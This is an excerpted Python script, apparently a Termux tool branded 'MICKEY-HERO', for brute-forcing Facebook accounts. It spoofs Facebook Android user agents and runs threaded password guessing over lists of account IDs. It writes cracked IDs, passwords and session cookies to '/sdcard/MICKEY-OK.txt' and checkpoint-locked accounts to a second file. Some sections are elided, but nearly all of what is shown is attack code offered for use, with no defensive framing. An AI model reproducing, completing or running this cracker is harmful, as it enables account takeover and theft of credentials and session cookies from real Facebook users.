...
print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mMICKEY-HERO\33[1;91m⊁ ')
...
\033[1;33m<><><><><><><><><<><><><><><><><><><><><><><>
 [<>] \033[1;36mOWNER   :  MICKEY-HERO
 [<>] \033[1;32mBROTHER :  NOBODY
 [<>] \033[1;34mGITHUB  :  MICKEY-HERO
...
def MICKEY2():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/280.0.0.48.122;FBAN/FB4A;FBAVFBBV/233235290;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/234040255;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950U;FBSV/9;FBOP/19;FBCA/arm64-v8a;]'
        return ua

class apvroval:
    def check():
        url = "https://github.com/MICKEY-HERO-90/MICKEY-HERO/blob/main/fuck.txt"
        import mechanize
...
def Awm_File():
    ...
    with tred(max_workers=30) as My_Tanisha:
        ...
        print(f" TOTAL OK ID SAVE IN : {G}/sdcard/MICKEY-OK.txt{W}")
        print(f" TOTAL CP ID SAVE IN : {R}/sdcard/MICKEY-CP.txt{W}")
...
def crack_file_A(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[MICKEY>FILE] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r {G}[MICKEY-OK] {ids} | {pas}')
                open('/sdcard/MICKEY-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                open('/sdcard/MICKEY-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def crack_rand(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f'\r\r {W}[MICKEY>RNDM] {loop}|03-December|{G}{len(oks)}{W}/{R}{len(cps)}')
    sys.stdout.flush()
    try:
        for pas in passlist:
            data = {
            ...
            if "access_token" in po:
                uid = str(po['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r {G}[MICKEY-OK] {uid} | {pas}')
                open('/sdcard/MICKEY-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
